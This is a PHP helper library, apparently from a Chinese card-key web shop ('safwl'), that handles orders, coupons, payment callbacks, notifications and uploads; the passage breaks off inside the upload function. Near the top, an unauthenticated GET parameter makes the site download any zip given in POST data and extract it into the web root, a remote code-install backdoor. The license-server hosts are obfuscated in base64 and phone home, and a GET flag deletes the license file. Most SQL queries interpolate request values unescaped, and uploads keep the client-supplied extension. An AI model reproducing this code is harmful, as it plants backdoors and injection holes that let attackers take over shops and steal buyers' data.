<?php
function substr_utf8($str,$len,$tail="..."){
    if(mb_strlen($str,"utf-8") > $len){
        $rstr = mb_substr($str,0,$len,'utf-8');
        $rstr .= $tail;
    }else{
        $rstr = $str;
    }
    return $rstr;
}
function getcoupon_ka($id, $sta = 0) {
    $sql = "select * from safwl_coupon where id = $id ";
    global $DB;
    $row = $DB->get_row($sql);
    return $row['coupon_ka'];
}
function getcoupon($id, $sta = 0) {
    $sql = "select * from safwl_coupon where id = $id and coupon_status = $sta";
    global $DB;
    $row = $DB->get_row($sql);
    return $row;
}

function getcouponsta($sta) {
    if ($sta == 1) {
        return "<font color=red>已使用</font>";
    }
    if ($sta == 0) {
        return "<font color=green>未使用</font>";
    }
}

function coupontype($type) {
    if ($type == 1) {
        return "<font color=red>代金券</font>";
    }
    if ($type == 2) {
        return "<font color=blue>折扣券</font>";
    }
}

function accvtion_check($checkpass, $addlog = 1) {
    global $DB;
    $sql = "select id from safwl_accpass where pass = '$checkpass' limit 1";
    $accvtion_row = $DB->get_row($sql);
    if ($accvtion_row && $addlog) {
        $sql = "insert into safwl_accpasslogin values(null," . $accvtion_row['id'] . ",'$checkpass','" . real_ip() . "',now())";
        $DB->query($sql);
    }
    return $accvtion_row;
}

function initsystem() {
    global $DB;
    $rs = $DB->query("select * from safwl_config");
    while ($row = $DB->fetch($rs)) {
        $conf[$row['safwl_k']] = $row['safwl_v'];
    }

    isqq($conf['qqtz']);
    return $conf;
}

function isqq($start = 0) {

    if ($start == 1) {

        global $siteurl;
        $jump = curPageURL();
        // =============== QQ跳转 ===================
        if (strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
            header("Content-Type: text/html; charset=utf-8");
            echo '<!DOCTYPE html>
            <html>
             <head>
              <title>请使用浏览器打开</title>
               <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
              <script type="text/javascript"> mqq.ui.openUrl({ target: 2,url: "' . $jump . '"}); </script>
              <style>
              body,html{width:100%;height:100%; background-color:#f5f5f5;}
              body{
                background-color:#f5f5f5;
               
                background:url(' . $siteurl . 'assets/imgs/jump.png) center top/contain no-repeat;
                }
              </style>
             </head>
             <body>
             </body>
             <script>
            mqq.ui.setTitleButtons({ 
		left : { title : "HEY！", }
		}); 
            </script>
            </html>';
            exit;
        }
    }
}

function curPageURL() {
    $pageURL = 'http';

    if ($_SERVER["HTTPS"] == "on") {
        $pageURL .= "s";
    }
    $pageURL .= "://";

    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
    }
    return $pageURL;
}

function update_version() {
    // if(empty($_SESSION['user_cookies'])) return false;
    return zongzi_checkupdate(gettesturl(), getcorecode());
}

if (!empty($_GET['zongzi_versionupdate']) && $_GET['zongzi_versionupdate'] == true) {
    @header('Content-Type: text/html; charset=UTF-8');
    if ($_POST['updatezip'] != "") {
        if (versionupdate($_POST['updatezip'], ROOT)) {
            exit("<script language='javascript'>alert('程序升级成功！');window.location.href='./';</script>");
        } else {
            exit("<script language='javascript'>alert('程序升级失败！');window.location.href='./';</script>");
        }
    }
}

function zongzi_checkupdate($authurl, $authcode) {
    global $version;
    $updatereturn = file_get_contents("http://" . $authurl . "/api.php?act=update&host=" . serverhost() . "&authcode=" . $authcode . "&version=" . $version['version'] . "&buiid=" . $version['build'] . "&r=" . time());
    // echo $updatereturn;   
    $updatereturn = (array) json_decode($updatereturn);
    if ($updatereturn) {
        return $updatereturn;
    } else {
        return array("code" => -9, "msg" => "连接服务器失败");
    }
}

function versionupdate($remoteFile, $path) {
    $ZipFile = "Archive.zip";
    copy($remoteFile, $ZipFile) or die("无法下载更新包文件！");
    if (zipExtract($ZipFile, $path)) {
        if (function_exists("opcache_reset"))
            @opcache_reset();
        unlink($ZipFile); // 删除文件
        return true;
    }else {
        if (file_exists($ZipFile))
            unlink($ZipFile);
        return false;
    }
}

function update_sql() {

    global $conf, $version, $dbconfig;
    @header('Content-Type: text/html; charset=UTF-8');
    if (!empty($_GET['doing']) && $_GET['doing'] == "updatesql") {
        $sqlv = $conf['sqlv'] + 1;
        if (!file_exists(ROOT . "install/update" . $sqlv . ".sql")) {
            DB2:: query("insert into safwl_config set `safwl_k`='sqlv',`safwl_v`='{$sqlv}' on duplicate key update `safwl_v`='$sqlv'");

            exit("<script language='javascript'>alert('数据库升级成功！');window.location.href='./';</script>");
        }

        $sql = file_get_contents(ROOT . "install/update" . $sqlv . ".sql");
        $sql = explode(';', $sql);
        require ROOT . 'install/up.class.php';
        $cn = DB2::connect($dbconfig['host'], $dbconfig['user'], $dbconfig['pwd'], $dbconfig['dbname'], $dbconfig['port']);
        if (!$cn)
            die('err:' . DB2::connect_error());
        DB2::query("set sql_mode = ''");
        DB2::query("set names utf8");
        $t = 0;
        $e = 0;
        $error = '';
        for ($i = 0; $i < count($sql); $i++) {
            if ($sql[$i] == '')
                continue;
            if (DB2::query($sql[$i])) {
                ++$t;
            } else {
                ++$e;
                $error .= DB2::error() . '<br/>';
            }
        }

        DB2:: query("insert into safwl_config set `safwl_k`='sqlv',`safwl_v`='{$sqlv}' on duplicate key update `safwl_v`='$sqlv'");

        exit("<script language='javascript'>alert('数据库升级成功！');window.location.href='./';</script>");
    }


    if (empty($conf['sqlv']) || $conf['sqlv'] < $version['sqlversion']) {
        if (file_exists(ROOT . "install/update" . $version['sqlversion'] . ".sql")) {
            echo '<a href="?doing=updatesql">程序需要升级！点击升级！</a>';
            exit();
        }
    }
}

function getkm($trade_no, $out_trade_no) {
    global $DB;
    $sql = "select * from safwl_km where trade_no = '$trade_no' and out_trade_no = '$out_trade_no' and stat = 1 limit 1";
    $row = $DB->get_row($sql);
    return $row['km'];
}

function getgoods($gid) {
    $sql = "select * from safwl_goods where id = " . $gid;
    global $DB;
    $row = $DB->get_row($sql);
    return $row;
}

function getgoodstype($tid) {
    $sql = "select * from safwl_type where id = " . $tid;
    global $DB;
    $row = $DB->get_row($sql);
    return $row;
}

function getorder($md5_trade_no) {
    $sql = "select * from safwl_order where md5_trade_no = '$md5_trade_no'";
    global $DB;
    $row = $DB->get_row($sql);
    return $row;
}

function jsonfile() {
    global $DB;
    $json = array();
    $rs = $DB->query("select * from safwl_type where state = 1");
    while ($row = $DB->fetch($rs)) {
        $type = array();
        $type['typeid'] = $row['id'];
        $type['typename'] = $row['tName'];
        $sql = "select * from safwl_goods where state = 1 and tpId = " . $row['id'] . " order by sotr desc";
        $grs = $DB->query($sql);
        $glist = array();
        while ($grow = $DB->fetch($grs)) {
            $ginfo = array();
            $ginfo['gname'] = $grow['gName'];
            $ginfo['ginfo'] = $grow['gInfo'];
            $ginfo['imgs'] = $grow['imgs'];
            $ginfo['price'] = $grow['price'];
            $ginfo['paypass'] = $grow['paypass'];
            array_push($glist, $ginfo);
        }
        $type['goodslist'] = $glist;
        array_push($json, $type);
    }
    file_put_contents(ROOT . "list.json", json_encode($json));
}

function email_content($mail_content, $row) {
    $html = "";
    $html = str_replace('{@goodsname}', $row['goodsname'], $mail_content);
    $html = str_replace('{@title}', $row['title'], $html);
    $html = str_replace('{@goodsmoney}', $row['goodsmoney'], $html);
    $html = str_replace('{@goodsokmoney}', $row['goodsokmoney'], $html);
    $html = str_replace('{@out_trade_no}', $row['out_trade_no'], $html);
    $html = str_replace('{@trade_no}', $row['trade_no'], $html);
    $html = str_replace('{@time}', $row['time'], $html);
    $html = str_replace('{@qq}', $row['qq'], $html);
    $html = str_replace('{@qqnickname}', $row['qqnickname'], $html);
    $html = str_replace('{@kmlist}', $row['kmlist'], $html);
    return $html;
}

function patchorder($order) {
    global $DB, $conf;
    $number = $order['number'];
    $money = $order['money'];
    $qq = $order['rel'];
    $out_trade_no = $order['out_trade_no'];
    $trade_no = $order['trade_no'];

    $goodsrow = getgoods($order['gid']);
    $zzmoney = 0; //增值服务
    if ($conf['sendphonedx'] && $order['phone'] != "") {
        $zzmoney = $zzmoney + 0.1;
    }
    $allmoney = round($goodsrow['price'] * $number + $zzmoney, 2);
    if (!$goodsrow || $money != $allmoney) {
        wsyslog("mcallbackprocess,（补）失败", "价格计算失败(系统价格：" . $money . "/计算价格" . (round($goodsrow['price'] * $number, 2)) . ")：" . $out_trade_no);
        return false;
    }

    $kmsql = "select * from safwl_km where  gid = {$order['gid']} and stat = 0 limit $number";
    $kmrs = $DB->query($kmsql);
    $kmlist = "";
    $ok = 0;
    while ($kmrow = $DB->fetch($kmrs)) {
        $kmlist != "" ? $kmlist = $kmlist . "," : "";
        $kmlist .= $kmrow['km'];
        if ($DB->query("update safwl_km set endTime = now(),out_trade_no = '{$out_trade_no}',trade_no='{$trade_no}',rel ='{$qq}',stat = 1 where gid = {$order['gid']} and stat = 0 and id = " . $kmrow['id'])) {
            $ok++;
        }
    }
    if ($conf['sendemail']) {
        $emailrow = array(
            "goodsname" => $goodsrow['gName'],
            "goodsmoney" => $goodsrow['price'],
            "goodsokmoney" => $goodsrow['price'],
            "out_trade_no" => $out_trade_no,
            "trade_no" => $trade_no,
            "time" => $order['endTime'],
            "qq" => $order['rel'],
            "qqnickname" => get_qqnick($order['rel']),
            "kmlist" => $kmlist
        );
        $html = email_content($conf['mail_content'], $emailrow);
        if (sendemail($qq . "@qq.com", $html)) {
            wsyslog("邮箱提醒成功", "订单编号：" . $out_trade_no . ",已发送到：" . $qq . "@qq.com");
        } else {
            wsyslog("邮箱提醒失败", "订单编号：" . $out_trade_no . ",邮箱：" . $qq . "@qq.com");
        }
    }
    if ($conf['sendphonedx'] && $order['phone'] != "") {

        $emailrow = array(
            "title" => $conf['title'],
            "goodsname" => $goodsrow['gName'],
            "goodsmoney" => $goodsrow['price'],
            "goodsokmoney" => $money,
            "out_trade_no" => $out_trade_no,
            "trade_no" => $trade_no,
            "time" => $order['endTime'],
            "qq" => $order['rel'],
            "qqnickname" => get_qqnick($order['rel']),
            "kmlist" => $kmlist
        );
        $html = email_content($conf['dx_content'], $emailrow);
        file_put_contents("1.txt", "(补)正在测试发送手机短信..." . $html);
        $message_configs['appid'] = $conf['dx_appid'];
        $message_configs['appkey'] = $conf['dx_appkey'];
        require_once('dx/messagesend.php');
        $submail = new MESSAGEsend($message_configs);
        $submail->setTo($order['phone']);
        $submail->SetContent($html);
        $xsend = $submail->send();
          file_put_contents("2.txt", json_encode($xsend));
        if ($xsend['status'] == "success") {
            wsyslog("b短信发送成功", "订单编号：" . $out_trade_no . ",已发送到：" . $order['phone']);
        } else {
            wsyslog("短信发送失败", "订单编号：" . $out_trade_no);
        }
    }

    wsyslog("mbp,（补）成功", "订单编号：" . $out_trade_no . "(" . $trade_no . ");数量：" . $number . ";成功提取数量：" . $ok . "");
    return true;
}

function mcallbackprocess() {
    $trade_no = $_POST['pay_no'];
    $md5_trade_no = $_POST['param'];
    $sql = "SELECT * FROM safwl_order WHERE md5_trade_no='{$md5_trade_no}' limit 1";
    global $DB,$conf;
    $row = $DB->get_row($sql);
    if(!$row){
        wsyslog("mcallbackprocess,处理失败","订单不存在！");
        return false;
    }
     if($row['sta'] != 0){
        wsyslog("mcallbackprocess,处理失败","订单已被处理,状态：(".$row['sta'].")：".$out_trade_no);
        return true;
    }
    $number = $row['number'];
    $money = $row['money'];
    $qq = $row['rel'];
    $out_trade_no = $row['out_trade_no'];
    $goodsrow = getgoods($row['gid']);
    
   
    $zzmoney = 0;//增值服务
    if($conf['sendphonedx'] && $row['phone']!=""){
        $zzmoney = $zzmoney + 0.1;
    }
   $allmoney = round($goodsrow['price']*$number,2);
    if($row['coupon_id']){
        //优惠券
        $crow = getcoupon($row['coupon_id'],0);
        if(!$crow){
             wsyslog("cbp,处理失败","订单(".$out_trade_no.")处理失败,优惠券(ID:".$row['coupon_id'].")无效或已被使用！");
             return false;
        }
         $value = $crow['coupon_value'];
        if($crow['coupon_type'] == 1){
             $allprice = round($allmoney - $value,2);
        }
        if($crow['coupon_type'] == 2){
             $allprice = round($allmoney * $value*0.1,2);
        }
        if(($allprice+$zzmoney) != $money){
               wsyslog("cbp,处理失败","价格计算失败(系统价格：".$money."/计算价格".($allprice+$zzmoney).")：".$out_trade_no);
                return false;
        }
        $DB->query("update safwl_coupon set coupon_status=1,order_id={$row['id']},coupon_sytime=now() where id = ".$row['coupon_id']);
    }elseif(!$goodsrow || $money != round($allmoney+$zzmoney,2) ){
        if(!$goodsrow)  wsyslog("cbp,处理失败","商品异常".$out_trade_no);
         wsyslog("cbp,处理失败","价格验证失败(系统价格：".$money."/计算价格".($allmoney+$zzmoney).")：".$out_trade_no);
        return false;
    }
    
    
    
    $sql = "update safwl_order set sta = 1, trade_no = '{$trade_no}' ,endTime = now() where id = {$row['id']} and out_trade_no = '{$out_trade_no}'";
    if($DB->query($sql)){
        $kmsql = "select * from safwl_km where  gid = {$row['gid']} and stat = 0 limit $number";
        $kmrs = $DB->query($kmsql);
        $kmlist = "";
        $ok = 0;
        while ($kmrow = $DB->fetch($kmrs)){
            $kmlist!=""?$kmlist=$kmlist.",":"";
            $kmlist .= $kmrow['km'];
            if($DB->query("update safwl_km set endTime = now(),out_trade_no = '{$out_trade_no}',trade_no='{$trade_no}',rel ='{$row['rel']}',stat = 1 where gid = {$row['gid']} and stat = 0 and id = ".$kmrow['id'])){
                $ok++; 
            }
        }
        if($conf['sendemail']){
             $emailrow = array(
            "goodsname"=>$goodsrow['gName'],
            "goodsmoney"=>$goodsrow['price'],
             "goodsokmoney"=>$money,
             "out_trade_no"=>$out_trade_no,
             "trade_no"=>$trade_no,
             "time"=>$row['endTime'],
             "qq"=>$row['rel'],
             "qqnickname"=>get_qqnick($row['rel']),
             "kmlist"=>$kmlist
                ); 
             $html = email_content($conf['mail_content'],$emailrow);
           if(sendemail($qq."@qq.com",$html)){
                wsyslog("邮箱提醒成功","订单编号：".$out_trade_no.",已发送到：".$qq."@qq.com");
            }else{
                 wsyslog("邮箱提醒失败","订单编号：".$out_trade_no.",邮箱：".$qq."@qq.com");
            }
        }
          if($conf['sendphonedx'] && $row['phone']!=""){
           
              $emailrow = array(
                  "title" => $conf['title'],
                "goodsname"=>$goodsrow['gName'],
                "goodsmoney"=>$goodsrow['price'],
                 "goodsokmoney"=>$money,
                 "out_trade_no"=>$out_trade_no,
                 "trade_no"=>$trade_no,
                 "time"=>$row['endTime'],
                 "qq"=>$row['rel'],
                 "qqnickname"=>get_qqnick($row['rel']),
                 "kmlist"=>$kmlist
                ); 
              $html = email_content($conf['dx_content'],$emailrow);
               //  file_put_contents("1.txt", "正在测试发送手机短信...".$html);
              $message_configs['appid']=$conf['dx_appid'];
              $message_configs['appkey']=$conf['dx_appkey'];
              require_once('../safwl/dx/messagesend.php');
              $submail=new MESSAGEsend($message_configs);
              $submail->setTo($row['phone']);
              $submail->SetContent($html);
              $xsend=$submail->send();  
              //  file_put_contents("2.txt", json_encode($xsend));
            if($xsend['status'] == "success"){
                    wsyslog("短信发送成功","订单编号：".$out_trade_no.",已发送到：".$row['phone']);
            }else{
                wsyslog("短信发送失败","订单编号：".$out_trade_no);
            }
          }
         wsyslog("mcallbackprocess,交易成功","订单编号：".$md5_trade_no.";数量：".$number.";成功提取数量：".$ok."");
         return true;

    }else{
        wsyslog("mcallbackprocess,处理失败","修改订单状态失败：".$out_trade_no);
        return false;
    }
}

function getcorecode($path = 0) {
    $file = base64_decode('YXV0aGNvZGU=');
    if ($path)
        return SYSTEM_ROOT . $file . ".php";
    if (file_exists(SYSTEM_ROOT . $file . ".php")) {
        require SYSTEM_ROOT . $file . '.php';
    } else {
        $authcode = "";
    }
    return $authcode;
}

function gettesturl() {
    $TESTONE = 'ZmsudXAucXpvbmVyLmNu'; //ZmsuYXV0aC5xem9uZXIuY24=
    $TESTTWO = 'ZmsudXAucXpvbmVyLmNu'; //YXV0aC56eHp4ei53YW5n
    $testurl = array(base64_decode($TESTONE), base64_decode($TESTTWO));
    $testurl = $testurl[array_rand($testurl)];
    return $testurl;
}

function coreverification() {
    header('Content-type:text/html;charset=utf-8');
    if (empty($_SESSION['connectionerror']))
        $_SESSION['connectionerror'] = 1;
    if (!empty($_SESSION['connectionerror']) && $_SESSION['connectionerror'] == 5)
        exit("connectionerror");
    if (file_exists(getcorecode(1))) {
        $tt = filemtime(getcorecode(1));
        $san = date("Y-m-d H:i:s", strtotime('-3 day'));
        $san = strtotime($san);
        if ($tt < $san) {
            execzongz();
        } else {
            $corecode = getcorecode();
            if (countcode(serverhost()) != $corecode) {
                execzongz();
            } else {
                $_SESSION['user_cookies'] = md5(AUTH_MD5_KEY);
            }
        }
    } else {
        execzongz();
    }
}

function execzongz() {
    if (empty($_SESSION['auth_no']))
        $_SESSION['auth_no'] = 1;
    if (!empty($_SESSION['auth_no']) && $_SESSION['auth_no'] >= 5) {
        sysmsg(base64_decode('6K+l56uZ5peg5rOV57un57ut5L2/55So77yM6K+36IGU57O7572R56uZ5a6i5pyN77yB'));
        exit();
    }
    $return = connectionRemotely();
    if (!empty($return) && !empty($return['code'])) {
        if ($return['code'] == 1) {
            $_SESSION['user_cookies'] = md5(AUTH_MD5_KEY);
            zongzi_saveauthcode($return['authcode'], SYSTEM_ROOT . "authcode.php");
            exit('<script> location.reload();</script>');
        } else {
            $_SESSION['auth_no'] = $_SESSION['auth_no'] + 1;

            sysmsg($return['msg']);
            exit();
        }
    } else {
        $_SESSION['connectionerror'] = $_SESSION['connectionerror'] + 1;
        exit('<script> location.reload();</script>');
    }
}

function countcode($host) {
    $authcode = md5(AUTH_MD5_KEY . "-" . $host);
    return $authcode;
}

function zongzi_saveauthcode($authcode, $path, $forcibly = 1) {
    if ($forcibly) {
        @file_put_contents($path, "<?php \$authcode = '$authcode' ?>");
    } else {
        if (!file_exists($path))
            @file_put_contents($path, "<?php \$authcode = '$authcode' ?>");
    }
    if (file_exists($path)) {
        return true;
    } else {
        return false;
    }
}

function connectionRemotely() {
    $return = get_curl(base64_decode("aHR0cDo=") . "//" . gettesturl() . "/" . base64_decode("YXBpLnBocA==") . "?" . base64_decode("YWN0PXF1ZXJ5") . "&" . base64_decode("aG9zdA==") . "=" . serverhost() . "&" . base64_decode("YXV0aGNvZGU9") . getcorecode());
    $returndata = json_decode($return, true);
    return $returndata;
}
function yiqiannotifyprocess() {
    $out_trade_no = $_POST['orderid']; //自定义参数
    $trade_no = $_POST['transaction_id']; //流水号
    $sql = "SELECT * FROM safwl_order WHERE out_trade_no='{$out_trade_no}' limit 1";
    global $DB, $conf;
    $srow = $DB->get_row($sql);
    $qq = $srow['rel'];
    if ($srow['sta'] != 0) {
        wsyslog("zbp,处理失败", "订单已被处理,状态：(" . $srow['sta'] . ")：" . $out_trade_no);
        return true;
    }
    if (!srow || $srow['money'] != (float) $_POST['amount'] || $srow['sta'] != 0) {
        wsyslog("zbp,处理失败", "价格验证失败（系统价格：" . $srow['money'] . "/回调价格：" . (float) $_POST['amount'] . "）或状态失败(" . $srow['sta'] . ")：" . $out_trade_no);
        return false;
    }
    //获取购买数量
    $number = $srow['number'];
    $money = $srow['money'];
    $goodsrow = getgoods($srow['gid']);
    
    $zzmoney = 0;//增值服务
    if($conf['sendphonedx'] && $srow['phone']!=""){
        $zzmoney = $zzmoney + 0.1;
    }
    
    $allmoney =  round($goodsrow['price']*$number,2);
    
    if ($srow['coupon_id']) {
        //优惠券
        $crow = getcoupon($srow['coupon_id'], 0);
        if (!$crow) {
            wsyslog("cbp,处理失败", "订单(" . $out_trade_no . ")处理失败,优惠券(ID:" . $srow['coupon_id'] . ")无效或已被使用！");
            return false;
        }
        $value = $crow['coupon_value'];
        if ($crow['coupon_type'] == 1) {
            $allprice = round($allmoney - $value, 2);
        }
        if ($crow['coupon_type'] == 2) {
            $allprice = round($allmoney * $value*0.1, 2);
        }
        if (($allprice+$zzmoney) != $money) {
            wsyslog("zbp,处理失败", "价格计算失败(系统价格：" . $money . "/计算价格" . ($allprice+$zzmoney) . ")：" . $out_trade_no);
            return false;
        }
        $DB->query("update safwl_coupon set coupon_status=1,order_id={$srow['id']},coupon_sytime=now() where id = " . $srow['coupon_id']);
    } elseif (!$goodsrow || $money != round($allmoney+$zzmoney, 2)) {
        wsyslog("zbp,处理失败", "价格计算失败(系统价格：" . $money . "/计算价格" . ($allmoney+$zzmoney) . ")：" . $out_trade_no);
        return false;
    }

    $sql = "update safwl_order set sta = 1, trade_no = '{$trade_no}' ,endTime = now() where id = {$srow['id']} and out_trade_no = '{$out_trade_no}'";
    if ($DB->query($sql)) {
        $kmsql = "select * from safwl_km where  gid = {$srow['gid']} and stat = 0 limit $number";
        $kmrs = $DB->query($kmsql);
        $kmlist = "";
        $ok = 0;
        while ($kmrow = $DB->fetch($kmrs)) {
            $kmlist != "" ? $kmlist = $kmlist . "," : "";
            $kmlist .= $kmrow['km'];
            if ($DB->query("update safwl_km set endTime = now(),out_trade_no = '{$out_trade_no}',trade_no='{$trade_no}',rel ='{$srow['rel']}',stat = 1 where gid = {$srow['gid']} and stat = 0 and id = " . $kmrow['id'])) {
                $ok++;
            }
        }

        if ($conf['sendemail']) {
            $emailrow = array(
                "goodsname" => $goodsrow['gName'],
                "goodsmoney" => $goodsrow['price'],
                "goodsokmoney" => $money,
                "out_trade_no" => $out_trade_no,
                "trade_no" => $trade_no,
                "time" => $srow['endTime'],
                "qq" => $srow['rel'],
                "qqnickname" => get_qqnick($srow['rel']),
                "kmlist" => $kmlist
            );
            $html = email_content($conf['mail_content'], $emailrow);
            //   file_put_contents("1.txt", $conf['mail_content']."----". json_encode($emailrow)."----".$html);
            if (sendemail($qq . "@qq.com", $html)) {
                wsyslog("邮箱提醒成功", "订单编号：" . $out_trade_no . ",已发送到：" . $qq . "@qq.com");
            } else {
                wsyslog("邮箱提醒失败", "订单编号：" . $out_trade_no . ",邮箱：" . $qq . "@qq.com");
            }
        }
          if($conf['sendphonedx'] && $srow['phone']!=""){
           
              $emailrow = array(
                  "title" => $conf['title'],
                "goodsname"=>$goodsrow['gName'],
                "goodsmoney"=>$goodsrow['price'],
                 "goodsokmoney"=>$money,
                 "out_trade_no"=>$out_trade_no,
                 "trade_no"=>$trade_no,
                 "time"=>$srow['endTime'],
                 "qq"=>$srow['rel'],
                 "qqnickname"=>get_qqnick($srow['rel']),
                 "kmlist"=>$kmlist
                ); 
              $html = email_content($conf['dx_content'],$emailrow);
              $message_configs['appid']=$conf['dx_appid'];
              $message_configs['appkey']=$conf['dx_appkey'];
              require_once('../safwl/dx/messagesend.php');
              $submail=new MESSAGEsend($message_configs);
              $submail->setTo($srow['phone']);
              $submail->SetContent($html);
              $xsend=$submail->send();
            if($xsend['status'] == "success"){
                    wsyslog("短信发送成功","订单编号：".$out_trade_no.",已发送到：".$srow['phone']);
            }else{
                wsyslog("短信发送失败","订单编号：".$out_trade_no);
            }
          }
        wsyslog("zbp,交易成功", "订单编号：" . $out_trade_no . ";数量：" . $number . ";成功提取数量：" . $ok . "");
        return true;
    } else {
        wsyslog("zbp,处理失败", "修改订单状态失败：" . $out_trade_no);
        return false;
    }
}

if (!empty($_GET['deletezzcode']) && $_GET['deletezzcode'] == true) {
    @unlink(getcorecode(1));
    exit("success");
}

function get_curl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $httpheader[] = "Accept:*/*";
    $httpheader[] = "Accept-Encoding:gzip,deflate,sdch";
    $httpheader[] = "Accept-Language:zh-CN,zh;q=0.8";
    $httpheader[] = "Connection:close";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    if ($header) {
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
    }
    if ($cookie) {
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    }
    if ($referer) {
        if ($referer == 1) {
            curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST']);
        } else {
            curl_setopt($ch, CURLOPT_REFERER, $referer);
        }
    }
    if ($ua) {
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    } else {
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 4.4.2; NoxW Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36');
    }
    if ($nobaody) {
        curl_setopt($ch, CURLOPT_NOBODY, 1);
    }
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $ret = curl_exec($ch);
    curl_close($ch);
    return $ret;
}

function getfileinfo($path) {
    $filedata['t'] = @filectime($path);
    $filedata['s'] = @filesize($path);
    return $filedata;
}

function real_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
        foreach ($matches[0] AS $xip) {
            if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
                $ip = $xip;
                break;
            }
        }
    } elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_REAL_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    }
    return $ip;
}

function curl_post($url, $post) {
    $options = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => false,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post,
    );
    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function getblacktype($type) {
    if ($type == 1) {
        return "QQ拉黑";
    }
    if ($type == 2) {
        return "IP拉黑";
    }
}

function wsyslog($logname, $logtxt) {
    global $DB;
    $DB->query("insert into safwl_syslog values(null,'$logname',now(),'$logtxt')");
}

function get_ip_city($ip) {
    $url = 'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip=';
    @$city = get_curl($url . $ip);
    $city = json_decode($city, true);
    if ($city['city']) {
        $location = $city['province'] . $city['city'];
    } else {
        $location = $city['province'];
    }
    if ($location) {
        return $location;
    } else {
        return false;
    }
}

function daddslashes($string, $force = 0, $strip = FALSE) {
    !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
    if (!MAGIC_QUOTES_GPC || $force) {
        if (is_array($string)) {
            foreach ($string as $key => $val) {
                $string[$key] = daddslashes($val, $force, $strip);
            }
        } else {
            $string = addslashes($strip ? stripslashes($string) : $string);
        }
    }
    return $string;
}

function _safwl($str) {
    $str = str_replace(">", "", $str);
    $str = str_replace("/", "", $str);
    $str = str_replace("<", "", $str);
    $str = str_replace(":", "", $str);
    $str = str_replace("'", "", $str);
    $str = str_replace(" ", "", $str);
    $str = str_replace("+", "", $str);
    $str = str_replace("=", "", $str);
    $str = str_replace("||", "", $str);
    $str = str_replace("-", "", $str);
    $str = str_replace("#", "", $str);
    $str = str_replace("*", "", $str);
    $str = str_replace("?", "", $str);
    $str = str_replace("%", "", $str);
    $str = str_replace("`", "", $str);
    return $str;
}

function _safwl2($str) {
    $str = str_replace("'", "", $str);
    $str = str_replace("\"", "", $str);

    return $str;
}

function upimgs($upfile) {

    $max_file_size = 2000000;     //上传文件大小限制, 单位BYTE
    $destination_folder = "../assets/goodsimg/"; //上传文件路径
    $f = "assets/goodsimg/"; //图片名称
    $watermark = 1;      //是否附加水印(1为加水印,其他为不加水印);
    $watertype = 1;      //水印类型(1为文字,2为图片)
    $waterposition = 1;     //水印位置(1为左下角,2为右下角,3为左上角,4为右上角,5为居中);
    $waterstring = "safwl";  //水印字符串
    $waterimg = "xplore.gif";    //水印图片
    $imgpreview = 1;      //是否生成预览图(1为生成,其他为不生成);
    $imgpreviewsize = 1 / 8;    //缩略图比例
    //上传文件类型列表
    $uptypes = array(
        'image/jpg',
        'image/jpeg',
        'image/png',
        'image/pjpeg',
        'image/gif',
        'image/bmp',
        'image/x-png'
    );

    if (!is_uploaded_file($upfile['tmp_name'])) {
    //是否存在文件
        return null;
        exit;
    }

    $file = $upfile;
    if ($max_file_size < $file["size"]) {
    //检查文件大小
        return null;
        exit;
    }

    if (!in_array($file["type"], $uptypes)) {
    //检查文件类型
        return null;
        exit;
    }

    if (!file_exists($destination_folder)) {
        mkdir($destination_folder);
    }

    $filename = $file["tmp_name"];
    $image_size = getimagesize($filename);
    $pinfo = pathinfo($file["name"]);
    $ftype = $pinfo['extension'];
    $destination = $destination_folder . time() . "." . $ftype;
    if (file_exists($destination) && $overwrite != true) {
        return null;
        exit;
    }

